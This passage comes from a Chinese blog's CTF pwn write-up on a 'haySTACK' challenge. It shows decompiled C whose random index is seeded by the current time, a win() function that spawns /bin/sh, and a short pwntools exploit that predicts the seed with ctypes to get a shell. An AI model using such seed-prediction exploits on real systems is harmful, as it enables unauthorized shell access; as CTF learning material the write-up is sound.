+<p>这里创建了 一个0x100000的数组，并填充为0xb00</p>
+<p>然后进入challenge函数</p>
+<h3 id="challenge"><a href="#challenge" class="headerlink" title="challenge:"></a>challenge:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">challenge</span><span class="params">(<span class="keyword">long</span> <span class="built_in">stack</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  <span class="keyword">int</span> iVar2;</span><br><span class="line">  <span class="keyword">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="keyword">int</span> local_44;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  <span class="keyword">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="keyword">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  iVar1 = random_value();</span><br><span class="line">  *(undefined4 *)(<span class="built_in">stack</span> + (<span class="keyword">long</span>)iVar1 * <span class="number">4</span>) = <span class="number">0x1337</span>;</span><br><span class="line">  local_38 = <span class="number">0</span>;</span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_20 = <span class="number">0</span>;</span><br><span class="line">  local_44 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> &lt; local_44) &#123;</span><br><span class="line">LAB_00101429:</span><br><span class="line">      <span class="keyword">if</span> (local_10 != *(<span class="keyword">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">        __stack_chk_fail();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite(<span class="string">&quot;Which haystack do you want to check?\n&quot;</span>,<span class="number">1</span>,<span class="number">0x25</span>,<span class="built_in">stdout</span>);</span><br><span class="line">    fgets((<span class="keyword">char</span> *)&amp;local_38,<span class="number">0x20</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    iVar2 = atoi((<span class="keyword">char</span> *)&amp;local_38);</span><br><span class="line">    <span class="keyword">if</span> (iVar2 &lt; <span class="number">0x100001</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (iVar2 == iVar1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hey you found a needle! And its number is 0x%08x! That\&#x27;s it!\n&quot;</span>,</span><br><span class="line">               (ulong)*(uint *)(<span class="built_in">stack</span> + (<span class="keyword">long</span>)iVar2 * <span class="number">4</span>));</span><br><span class="line">        win();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hey, you found a needle, but it\&#x27;s number is 0x%08x. I don\&#x27;t like that one\n&quot;</span>,</span><br><span class="line">               (ulong)*(uint *)(<span class="built_in">stack</span> + (<span class="keyword">long</span>)iVar2 * <span class="number">4</span>));</span><br><span class="line">        <span class="keyword">if</span> (local_44 == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">puts</span>(</span><br><span class="line">              <span class="string">&quot;Shoot, I forgot to tell you that I hid a needle in every stack. But I only have onefavorite needle&quot;</span></span><br><span class="line">              );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (local_44 == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Did I mention I\&#x27;m in a hurry? I need you to find it on your next guess&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      fwrite(<span class="string">&quot;I don\&#x27;t have that many haystacks!\n&quot;</span>,<span class="number">1</span>,<span class="number">0x22</span>,<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (local_44 == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I\&#x27;m out of time. Thanks for trying...&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LAB_00101429;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let\&#x27;s try again!&quot;</span>);</span><br><span class="line">    local_44 = local_44 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里观察到让iVar1与iVar2值相等可进入后门函数win</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iVar1 = random_value();</span><br><span class="line">*(undefined4 *)(<span class="built_in">stack</span> + (<span class="keyword">long</span>)iVar1 * <span class="number">4</span>) = <span class="number">0x1337</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ulong <span class="title">random_value</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> lVar1;</span><br><span class="line">  <span class="keyword">int</span> iVar2;</span><br><span class="line">  <span class="keyword">time_t</span> tVar3;</span><br><span class="line">  <span class="keyword">long</span> in_FS_OFFSET;</span><br><span class="line">  </span><br><span class="line">  lVar1 = *(<span class="keyword">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  tVar3 = time((<span class="keyword">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  srand((uint)tVar3);</span><br><span class="line">  iVar2 = rand();</span><br><span class="line">  <span class="keyword">if</span> (lVar1 != *(<span class="keyword">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">long</span>)iVar2 % <span class="number">0x100000</span> &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v0 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Ivar1为0至0x100000的随机值，其对应的数组的值被设置为0x1337</p>
+<p>从上面的图片中可得知ivar1是由当前时间初始化得到的随机值，我们通过from ctypes import CDLL可在python程序中使用C语言函数，产生相同的时间种子，从而得到相同的随机数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20210922173335323.png" alt="image-20210922173335323"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>最后的exp如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">from ctypes <span class="keyword">import</span> CDLL</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./haySTACK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">now=<span class="keyword">int</span>(time.time())</span><br><span class="line">libc.srand(now)</span><br><span class="line"></span><br><span class="line">guess=libc.rand()%<span class="number">0x100000</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Which haystack do you want to check?\n&#x27;</span>)</span><br><span class="line">io.sendline(str(guess))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2022/01/08/gdb%E8%B0%83%E8%AF%95/" title="gdb的使用">
+                    <div class="nextTitle">gdb的使用</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/01/08/ciscn_2019/" title="ciscn">
+                    <div class="prevTitle">ciscn</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:2811745785@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/wysyrg" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Alien-math"><span class="toc-number">1.</span> <span class="toc-text">Alien_math:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">main函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#second-question"><span class="toc-number">1.2.</span> <span class="toc-text">second_question:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#final-question"><span class="toc-number">1.3.</span> <span class="toc-text">final_question:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HayHACK"><span class="toc-number">2.</span> <span class="toc-text">HayHACK</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main-gt-sub143f"><span class="toc-number">2.1.</span> <span class="toc-text">main()-&gt;sub143f():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge"><span class="toc-number">2.2.</span> <span class="toc-text">challenge:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 21
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span>
+            <a class="archive-post-title" href="/2022/04/04/%E5%B3%BB%E6%9E%81pwn/">峻极pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span>
+            <a class="archive-post-title" href="/2022/03/19/stack%20pivoting/">stack pivoting</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span>
+            <a class="archive-post-title" href="/2022/03/15/libc-2.26/">[Untitled Post]</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2022/02/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span>
+            <a class="archive-post-title" href="/2022/01/16/large%20bin%20attack/">large bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/magicheap/">magicheap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/unsorted%20bin%20attack/">unsorted bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span>
+            <a class="archive-post-title" href="/2022/01/13/pwn200/">pwn200</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span>
+            <a class="archive-post-title" href="/2022/01/12/write%20some%20paper/">write some paper</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span>
+            <a class="archive-post-title" href="/2022/01/09/fastbin_attack/">fastbin_attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/overlapping%20chunks/">overlapping chunks</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/gdb%E8%B0%83%E8%AF%95/">gdb的使用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/csaw/">csaw部分题解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/ciscn_2019/">ciscn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/secretHolder_hitcon_2016/">secretHolder_hitcon_2016</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/unsafe_unlink/">unsafe_unlink</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/kernel_pwn%E7%8E%AF%E5%A2%83/">kernel pwn环境搭建</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/off-by-one/">off-by-one</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/pwnable%E5%88%B7%E9%A2%98/">pwnable刷题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="unsorted bin attack">
+                <span class="iconfont-archer">&#xe606;</span>
+                unsorted bin attack
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="house of spirit">
+                <span class="iconfont-archer">&#xe606;</span>
+                house of spirit
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="fastbin doule free">
+                <span class="iconfont-archer">&#xe606;</span>
+                fastbin doule free
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="os">
+                <span class="iconfont-archer">&#xe606;</span>
+                os
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Diary">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Diary
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20210823"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20210823"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20210823" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
